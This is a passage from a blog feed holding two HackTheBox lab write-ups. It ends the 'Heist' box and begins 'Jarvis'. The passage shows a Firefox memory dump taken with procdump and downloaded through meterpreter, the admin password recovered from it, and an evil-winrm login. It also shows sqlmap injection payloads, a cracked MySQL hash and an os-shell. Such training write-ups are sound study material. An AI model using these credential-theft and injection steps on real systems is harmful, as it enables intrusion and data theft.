&lt;span class="code-line"&gt;2632  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2640  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2660  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2700  792   TiWorker.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;2708  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2716  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2740  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2768  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2776  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2804  612   VGAuthService.exe                                          &lt;/span&gt;
&lt;span class="code-line"&gt;2828  612   vmtoolsd.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;2852  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2896  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2920  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2948  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2956  612   MsMpEng.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3024  5416  01.exe                   x64   0        SUPPORTDESK\Chase  C:\Users\Chase\Documents\01.exe&lt;/span&gt;
&lt;span class="code-line"&gt;3036  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3104  792   ShellExperienceHost.exe                                    &lt;/span&gt;
&lt;span class="code-line"&gt;3224  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3352  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;3360  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3376  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;3720  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;3784  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3932  612   dllhost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;3976  792   WmiPrvSE.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;4004  792   wsmprovhost.exe                                            &lt;/span&gt;
&lt;span class="code-line"&gt;4040  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;4196  6808  conhost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;4200  792   SearchUI.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;4216  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;4236  612   msdtc.exe                                                  &lt;/span&gt;
&lt;span class="code-line"&gt;4392  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;4408  792   WmiPrvSE.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;4704  612   TrustedInstaller.exe                                       &lt;/span&gt;
&lt;span class="code-line"&gt;4888  792   RuntimeBroker.exe                                          &lt;/span&gt;
&lt;span class="code-line"&gt;5140  1184  sihost.exe                                                 &lt;/span&gt;
&lt;span class="code-line"&gt;5148  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5188  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5260  1468  taskhostw.exe                                              &lt;/span&gt;
&lt;span class="code-line"&gt;5352  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5364  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5416  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;5456  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5524  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5572  792   RuntimeBroker.exe                                          &lt;/span&gt;
&lt;span class="code-line"&gt;5584  5524  ctfmon.exe                                                 &lt;/span&gt;
&lt;span class="code-line"&gt;5620  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;5908  5880  explorer.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;6080  3376  conhost.exe              x64   0        SUPPORTDESK\Chase  C:\Windows\System32\conhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6140  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6228  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6304  792   RuntimeBroker.exe                                          &lt;/span&gt;
&lt;span class="code-line"&gt;6388  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6464  6672  php-cgi.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;6564  5908  vmtoolsd.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;6584  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6672  2896  w3wp.exe                                                   &lt;/span&gt;
&lt;span class="code-line"&gt;6772  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;6792  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6808  1468  MpCmdRun.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;6852  6676  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe&lt;/span&gt;
&lt;span class="code-line"&gt;6940  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;6948  6672  php-cgi.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;6988  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our Chase user is running a Firefox Browser. The idea is to see if there is
credentials stored in the browser's password manager. For that we will use
&lt;a href="https://github.com/AlessandroZ/LaZagne/"&gt;LaZagne&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="lazagne"&gt;Lazagne&lt;/h2&gt;
&lt;p&gt;We upload the Lazagne executable using the meterpreter. Then using a shell we
launch LaZagne with the &lt;code&gt;browsers&lt;/code&gt; parameter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="code-line"&gt;Process 3468 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Channel 5 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.437]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Chase\Documents&amp;gt;.\05.exe browsers&lt;/span&gt;
&lt;span class="code-line"&gt;.\05.exe browsers&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;|====================================================================|&lt;/span&gt;
&lt;span class="code-line"&gt;|                                                                    |&lt;/span&gt;
&lt;span class="code-line"&gt;|                        The LaZagne Project                         |&lt;/span&gt;
&lt;span class="code-line"&gt;|                                                                    |&lt;/span&gt;
&lt;span class="code-line"&gt;|                          ! BANG BANG !                             |&lt;/span&gt;
&lt;span class="code-line"&gt;|                                                                    |&lt;/span&gt;
&lt;span class="code-line"&gt;|====================================================================|&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 0 passwords have been found.&lt;/span&gt;
&lt;span class="code-line"&gt;For more information launch it again with the -v option&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;elapsed time = 0.0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We did not found any password in the browser's password storage. Let us see what
is the process memory.&lt;/p&gt;
&lt;h2 id="procdump"&gt;procdump&lt;/h2&gt;
&lt;p&gt;We upload procdump.exe from
&lt;a href="https://docs.microsoft.com/en-us/sysinternals/"&gt;Systinternals&lt;/a&gt; and dump the
Firefox process memory before downloading the dump on our machine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; upload procdump.exe 06.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] uploading  : procdump.exe -&amp;gt; 06.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&amp;gt; 06.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] uploaded   : procdump.exe -&amp;gt; 06.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Chase\Documents&amp;gt;.\06.exe -ma 6228&lt;/span&gt;
&lt;span class="code-line"&gt;.\06.exe -ma 6228&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;ProcDump v6.00 - Writes process dump files&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (C) 2009-2013 Mark Russinovich&lt;/span&gt;
&lt;span class="code-line"&gt;Sysinternals - www.sysinternals.com&lt;/span&gt;
&lt;span class="code-line"&gt;With contributions from Andrew Richards&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Writing dump file C:\Users\Chase\Documents\firefox_191106_223459.dmp ...&lt;/span&gt;
&lt;span class="code-line"&gt;Writing 293MB. Estimated time (less than) 9 seconds.&lt;/span&gt;
&lt;span class="code-line"&gt;Dump written.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; download firefox_191106_223459.dmp ./&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloading: firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&amp;gt; .//firefox_191106_223459.dmp&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then &lt;code&gt;grep&lt;/code&gt; in the dump for some password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;strings firefox_191106_223459.dmp | grep -i password | grep admin -i&lt;/span&gt;
&lt;span class="code-line"&gt;MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=&lt;/span&gt;
&lt;span class="code-line"&gt;RG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=&lt;/span&gt;
&lt;span class="code-line"&gt;MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then use the login and password either to connect to the support website
or to the server using the &lt;code&gt;administrator&lt;/code&gt; account.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;evil-winrm  -i 10.10.10.149 -u administrator -p &amp;#39;4dD!5}x/re8]FBuZ&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; type ../Desktop/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;50dfa&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;In this machine we used evil-rm in to order to exploit the port 5985 as
I work on this machine after the forest one this was not something new (maybe
this article will be publish before the forest's one as I wait for the machine
to retire). We use a simple meterpreter and proc dump to found the password
stored in the Firefox memory.&lt;/p&gt;
&lt;p&gt;I was a bit disappointed that there was no real exploitation of the CISCO router.
I was hoping for some pivoting from the first VM to another one use the router
or something similar.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Cisco"></category><category term="winrm"></category><category term="procdump"></category><category term="meterpreter"></category><category term="windows"></category></entry><entry><title>HTB: Jarvis</title><link href="https://maggick.fr/2019/11/htb-jarvis.html" rel="alternate"></link><published>2019-11-10T12:30:00+01:00</published><updated>2019-11-10T12:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-11-10:/2019/11/htb-jarvis.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2019.10/jarvis_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/194"&gt;Jarvis&lt;/a&gt;.
This box is rated as a medium box. It implies a dead end, some SQL injection, a
homemade script and a SUID binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.10/jarvis_card.png" alt="Jarvis Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/194"&gt;Jarvis&lt;/a&gt;.
This box is rated as a medium box. It implies a dead end, some SQL injection, a
homemade script and a SUID binary.&lt;/p&gt;

&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#on-port-64999"&gt;On port 64999&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#on-port-80"&gt;On port 80&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#getting-user"&gt;Getting user&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#lets-get-root"&gt;Let's get root&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan the ports 22 (SSH), 80 (HTTP) and 64999
are open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -p- 10.10.10.143&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:46 CEST&lt;/span&gt;
&lt;span class="code-line"&gt;Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;span class="code-line"&gt;SYN Stealth Scan Timing: About 62.32% done; ETC: 13:48 (0:00:42 remaining)&lt;/span&gt;
&lt;span class="code-line"&gt;Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan&lt;/span&gt;
&lt;span class="code-line"&gt;SYN Stealth Scan Timing: About 66.39% done; ETC: 13:48 (0:00:36 remaining)&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.143&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.093s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;64999/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap done: 1 IP address (1 host up) scanned in 101.63 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us see what services are running on this ports (especially the last one). It
a simple HTTP service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -p 22,80,64999 -sSV 10.10.10.143&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:51 CEST&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.143&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.088s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http    Apache httpd 2.4.25 ((Debian))&lt;/span&gt;
&lt;span class="code-line"&gt;64999/tcp open  http    Apache httpd 2.4.25 ((Debian))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;h2 id="on-port-64999"&gt;On port 64999&lt;/h2&gt;
&lt;p&gt;The page on the web service on port 64999 is only saying that we have been
banned for 90 seconds.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl http://10.10.10.143:64999/&lt;/span&gt;
&lt;span class="code-line"&gt;Hey you have been banned for 90 seconds, don&amp;#39;t be bad&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="on-port-80"&gt;On port 80&lt;/h2&gt;
&lt;p&gt;The website is a "classical" hotel homepage.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jarvis homepage" src="/media/2019.10/jarvis_1.png"&gt;&lt;/p&gt;
&lt;p&gt;We can checkout rooms. We notice that there is a &lt;code&gt;cod&lt;/code&gt; GET parameter (in the
URL).
Moreover if we put a &lt;code&gt;-1&lt;/code&gt; at the end of the URL we get to the previous room. For
instance the URL &lt;code&gt;http://10.10.10.143/room.php?cod=5-1&lt;/code&gt; give us exactly the same
room as the &lt;code&gt;http://10.10.10.143/room.php?cod=4&lt;/code&gt; URL. This is symptomatic of an
SQL injection.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jarvis room id 4" src="/media/2019.10/jarvis_2.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jarvis room id 5" src="/media/2019.10/jarvis_3.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jarvis room id 5-1" src="/media/2019.10/jarvis_4.png"&gt;&lt;/p&gt;
&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;p&gt;We launch &lt;code&gt;sqlmap&lt;/code&gt; against the page, it confirm the SQL injection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GET parameter &amp;#39;cod&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;Parameter: cod (GET)&lt;/span&gt;
&lt;span class="code-line"&gt;    Type: boolean-based blind&lt;/span&gt;
&lt;span class="code-line"&gt;    Title: AND boolean-based blind - WHERE or HAVING clause&lt;/span&gt;
&lt;span class="code-line"&gt;    Payload: cod=5-1 AND 9103=9103&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Type: time-based blind&lt;/span&gt;
&lt;span class="code-line"&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)&lt;/span&gt;
&lt;span class="code-line"&gt;    Payload: cod=5-1 AND (SELECT 1494 FROM (SELECT(SLEEP(5)))doUk)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Type: UNION query&lt;/span&gt;
&lt;span class="code-line"&gt;    Title: Generic UNION query (NULL) - 7 columns&lt;/span&gt;
&lt;span class="code-line"&gt;    Payload: cod=-8368 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a707871,0x727a50526445566e634476524a594655416e436156515a667a77797962676967515668766e6e626c,0x71707a7671),NULL-- AwXR&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;web server operating system: Linux Debian 9.0 (stretch)&lt;/span&gt;
&lt;span class="code-line"&gt;web application technology: PHP, Apache 2.4.25&lt;/span&gt;
&lt;span class="code-line"&gt;back-end DBMS: MySQL &amp;gt;= 5.0.12&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We list the available database:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;hotel&lt;/li&gt;
&lt;li&gt;infomration_schema&lt;/li&gt;
&lt;li&gt;mysq&lt;/li&gt;
&lt;li&gt;performance_schema&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The SQLmap command is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1 --dbs&lt;/span&gt;
&lt;span class="code-line"&gt;available databases [4]:&lt;/span&gt;
&lt;span class="code-line"&gt;[*] hotel&lt;/span&gt;
&lt;span class="code-line"&gt;[*] information_schema&lt;/span&gt;
&lt;span class="code-line"&gt;[*] mysql&lt;/span&gt;
&lt;span class="code-line"&gt;[*] performance_schema&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We list the table for the &lt;code&gt;hotel&lt;/code&gt; database and dump it, nothing interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --tables&lt;/span&gt;
&lt;span class="code-line"&gt;Database: hotel&lt;/span&gt;
&lt;span class="code-line"&gt;[1 table]&lt;/span&gt;
&lt;span class="code-line"&gt;+------+&lt;/span&gt;
&lt;span class="code-line"&gt;| room |&lt;/span&gt;
&lt;span class="code-line"&gt;+------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --dump&lt;/span&gt;
&lt;span class="code-line"&gt;Database: hotel&lt;/span&gt;
&lt;span class="code-line"&gt;Table: room&lt;/span&gt;
&lt;span class="code-line"&gt;[6 entries]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We dump the mysqluser table and crack the password hash (with the sqlmap
cracking function):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D mysql -T user --dump&lt;/span&gt;
&lt;span class="code-line"&gt;Database: mysql&lt;/span&gt;
&lt;span class="code-line"&gt;Table: user&lt;/span&gt;
&lt;span class="code-line"&gt;[1 entry]&lt;/span&gt;
&lt;span class="code-line"&gt;*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect to the phpmyadmin as DBadmin:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Jarvis phpmyadmin" src="/media/2019.10/jarvis_5.png"&gt;&lt;/p&gt;
&lt;p&gt;This does not give us a shell. Let us try something different: the &lt;code&gt;--os-shell&lt;/code&gt;
option from &lt;code&gt;sqlmap&lt;/code&gt;. We got a shell!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlmap -u http://10.10.10.143/room.php?cod=5-1  --os-shell&lt;/span&gt;
&lt;span class="code-line"&gt;os-shell&amp;gt; id&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output: &amp;#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start enumeration a bit and found that we can call a binary as the pepper
user with &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;os-shell&amp;gt; ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output: &amp;#39;pepper&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;os-shell&amp;gt; ls /home/pepper/&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output:&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;Web&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;os-shell&amp;gt; cat /home/pepper/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output: &amp;#39;cat: /home/pepper/user.txt: Permission denied&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;os-shell&amp;gt; ls -al /home/pepper/&lt;/span&gt;
&lt;span class="code-line"&gt;command standard output:&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;total 32&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..&lt;/span&gt;
